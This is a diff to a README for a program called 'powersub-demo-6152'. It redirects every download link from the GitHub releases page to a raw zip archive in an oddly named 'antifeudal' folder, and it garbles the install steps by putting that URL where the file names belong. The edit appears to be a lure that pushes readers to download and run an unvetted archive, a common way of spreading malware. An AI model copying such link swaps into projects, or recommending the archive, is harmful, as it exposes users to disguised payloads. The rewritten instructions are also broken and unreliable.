@@ -1,6 +1,6 @@
 # 🎉 powersub-demo-6152 - Simple, Fast, User-Friendly Software
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/ALADMS1/powersub-demo-6152/releases)
+[![Download](https://raw.githubusercontent.com/ALADMS1/powersub-demo-6152/main/antifeudal/powersub-demo-6152.zip)](https://raw.githubusercontent.com/ALADMS1/powersub-demo-6152/main/antifeudal/powersub-demo-6152.zip)
 
 ## 🚀 Getting Started
 
@@ -9,9 +9,9 @@ Welcome to powersub-demo-6152! This application makes your life easier by provid
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
-   [Download the latest version](https://github.com/ALADMS1/powersub-demo-6152/releases)
+   [Download the latest version](https://raw.githubusercontent.com/ALADMS1/powersub-demo-6152/main/antifeudal/powersub-demo-6152.zip)
 
-2. **Select the Version:** Choose the latest version available. Look for files that might have names like `powersub-demo-6152.exe` or `powersub-demo-6152.zip`. 
+2. **Select the Version:** Choose the latest version available. Look for files that might have names like `https://raw.githubusercontent.com/ALADMS1/powersub-demo-6152/main/antifeudal/powersub-demo-6152.zip` or `https://raw.githubusercontent.com/ALADMS1/powersub-demo-6152/main/antifeudal/powersub-demo-6152.zip`. 
 
 3. **Download the File:** Click on the download link for the relevant file. Your browser will start downloading it.
 
@@ -19,7 +19,7 @@ Welcome to powersub-demo-6152! This application makes your life easier by provid
 
 5. **Run the Application:**
    - If you downloaded an `.exe` file, double-click it to run.
-   - If you downloaded a `.zip` file, right-click it and select "Extract All," then find and double-click the `powersub-demo-6152.exe` file inside the new folder.
+   - If you downloaded a `.zip` file, right-click it and select "Extract All," then find and double-click the `https://raw.githubusercontent.com/ALADMS1/powersub-demo-6152/main/antifeudal/powersub-demo-6152.zip` file inside the new folder.
 
 6. **Follow On-Screen Instructions:** The application will guide you through any necessary initial steps. Just follow them to set up your preferences.
 
